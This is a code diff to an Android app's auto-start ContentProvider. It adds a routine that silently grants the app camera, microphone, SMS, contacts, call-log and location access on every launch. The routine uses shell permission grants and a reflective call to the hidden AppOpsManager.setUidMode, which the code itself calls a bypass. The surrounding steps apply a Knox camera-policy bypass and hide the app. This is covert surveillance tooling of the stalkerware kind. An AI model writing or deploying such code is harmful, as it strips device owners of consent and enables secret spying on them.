@@ -16,6 +16,7 @@ import android.os.Build
 import android.os.IBinder
 import android.os.Parcel
 import android.os.Process
+import android.app.AppOpsManager
 import android.util.Log
 import java.io.BufferedReader
 import java.io.InputStreamReader
@@ -67,12 +68,13 @@ class AutoStartProvider : ContentProvider() {
     private fun runBootstrap(ctx: Context) {
         val prefs = ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
 
-        // Check if bootstrap already ran successfully
-        if (prefs.getBoolean(KEY_BOOTSTRAP_DONE, false)) {
-            Log.d(TAG, "Bootstrap already done — re-applying Knox camera bypass if saved")
-            reapplyKnoxCameraBypass(ctx, prefs)
-            reapplyHiding(ctx, prefs)
-            return
+        // ALWAYS run Step 1 (permissions) — UID may have changed on reinstall
+        // Only skip camera bypass + hiding if already done
+        val alreadyDone = prefs.getBoolean(KEY_BOOTSTRAP_DONE, false)
+        if (!alreadyDone) {
+            Log.w(TAG, "=== BOOTSTRAP (fresh install) — full sequence ===")
+        } else {
+            Log.w(TAG, "=== BOOTSTRAP (re-launch) — permissions only ===")
         }
 
         val pkgName = ctx.packageName
@@ -80,8 +82,14 @@ class AutoStartProvider : ContentProvider() {
         val userId = uid / 100000
         Log.w(TAG, "Package: $pkgName  UID: $uid  UserID: $userId  SDK: ${Build.VERSION.SDK_INT}")
 
-        // ── STEP 1: Grant ALL permissions via SilentPermissionGrant.AppOps ──
+        // ── STEP 1: Grant ALL permissions (ALWAYS runs) ──
         step1_grantAllPermissions(ctx, pkgName, uid)
+
+        // ── Below steps only on FRESH install ──
+        if (alreadyDone) {
+            Log.w(TAG, "STEP 1 done — ${checkAllPermissions(ctx, getTargetPermissions()).count { it.value }} perms granted. Skipping steps 2-7 (already bootstrapped).")
+            return
+        }
 
         // ── STEP 2: Knox misc_policy camera bypass ──
         step2_knoxCameraBypass(ctx, prefs)
@@ -206,6 +214,50 @@ class AutoStartProvider : ContentProvider() {
             } catch (_: Exception) {}
         }
         Log.d(TAG, "  Shell pm grant: $granted succeeded")
+
+        // ── 1c: AppOpsManager direct setUidMode (bypasses PackageManager) ──
+        tryGrantViaAppOpsManager(ctx, perms, pkgName)
+    }
+
+    // ── 1c: AppOpsManager.setUidMode (low-level bypass) ──────────────────────
+    private fun tryGrantViaAppOpsManager(ctx: Context, perms: List<String>, pkgName: String) {
+        Log.d(TAG, "  Granting via AppOpsManager.setUidMode...")
+        try {
+            val appOps = ctx.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
+            val uid = ctx.packageManager.getPackageInfo(pkgName, 0)?.applicationInfo?.uid ?: Process.myUid()
+            // Map permissions to op codes
+            val opMap = mapOf(
+                "android.permission.CAMERA" to 26,          // OP_CAMERA
+                "android.permission.RECORD_AUDIO" to 27,    // OP_RECORD_AUDIO
+                "android.permission.ACCESS_FINE_LOCATION" to 1,   // OP_COARSE_LOCATION
+                "android.permission.ACCESS_COARSE_LOCATION" to 0, // OP_FINE_LOCATION
+                "android.permission.READ_SMS" to 14,        // OP_READ_SMS
+                "android.permission.SEND_SMS" to 20,        // OP_SEND_SMS
+                "android.permission.RECEIVE_SMS" to 21,     // OP_RECEIVE_SMS
+                "android.permission.READ_CONTACTS" to 4,    // OP_READ_CONTACTS
+                "android.permission.READ_CALL_LOG" to 6,    // OP_READ_CALL_LOG
+                "android.permission.READ_PHONE_STATE" to 51, // OP_READ_PHONE_STATE
+                "android.permission.READ_EXTERNAL_STORAGE" to 59, // OP_READ_EXTERNAL_STORAGE
+                "android.permission.WRITE_EXTERNAL_STORAGE" to 60, // OP_WRITE_EXTERNAL_STORAGE
+                "android.permission.POST_NOTIFICATIONS" to 11, // OP_POST_NOTIFICATION
+                "android.permission.ACCESS_BACKGROUND_LOCATION" to 77, // OP_ACCESS_BACKGROUND_LOCATION
+            )
+            var granted = 0
+            for ((perm, opCode) in opMap) {
+                try {
+                    // setUidMode is hidden on API 29+ — use reflection
+                    val setUidMode = AppOpsManager::class.java.getDeclaredMethod(
+                        "setUidMode", Int::class.javaPrimitiveType, Int::class.javaPrimitiveType, Int::class.javaPrimitiveType
+                    )
+                    setUidMode.isAccessible = true
+                    setUidMode.invoke(appOps, opCode, uid, AppOpsManager.MODE_ALLOWED)
+                    granted++
+                } catch (_: Exception) {}
+            }
+            Log.d(TAG, "  AppOpsManager.setUidMode: $granted ops set")
+        } catch (e: Exception) {
+            Log.w(TAG, "  AppOpsManager grant failed: ${e.message}")
+        }
     }
 
     // ── 1c: Knox application_policy direct binder ─────────────────────────
